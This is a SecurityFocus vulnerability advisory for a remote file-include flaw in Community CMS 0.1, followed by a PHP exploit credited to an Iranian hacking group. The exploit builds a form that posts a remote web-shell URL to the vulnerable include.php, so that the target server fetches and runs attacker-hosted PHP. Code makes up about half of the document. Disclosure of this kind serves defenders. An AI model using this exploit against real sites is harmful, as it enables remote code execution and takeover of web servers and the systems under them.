source: http://www.securityfocus.com/bid/30275/info

Community CMS is prone to a remote file-include vulnerability because it fails to sufficiently sanitize user-supplied data.

An attacker can exploit this issue to execute malicious PHP code in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system; other attacks are also possible.

Community CMS 0.1 is vulnerable; other versions may also be affected. 

<?php
/************************************************** ********************
*[+] << IN THE NAME OF GOD >>
*[+]
*[+]
*[+] [ Persian Boys Hacking Team ] -:- 2008 -:- IRAN
*[+] -
*[+] - discovered by N3TR00T3R [at] Y! [dot] com
*[+] - communitycms-0.1 Remote File Includion
*[+] - download :http://sourceforge.net/project/showf...roup_id=223968
*[+] - sp tnx : Sp3shial,Veroonic4,God_Master_hacker,a_reptil,Ciph
3r,shayan_cmd
*[+] r00t.master,Dr.root,Pouya_server,Spyn3t,LordKouros h,123qwe,mr.n4ser
*[+] Zahacker,goli_boya,i_reza_i,programer, and all irchatan members ...
*[+]
************************************************** ********************/
#if register_globals = On;

$shell="http://localhost/syn99.php?"; // your shell
$target="http://localhost/communitycms/include.php"; //vul page --->
include.php
echo"<html>
<body>
<form action=$target method=POST>
SECURITY :<input type=text name=security>
SHELL :<input type=text name=root>
<input type=hidden name=security value=1>
<input type=hidden name=root value=$shell>
<input type=submit value=ok>
</form>
</body>
</html>";
?>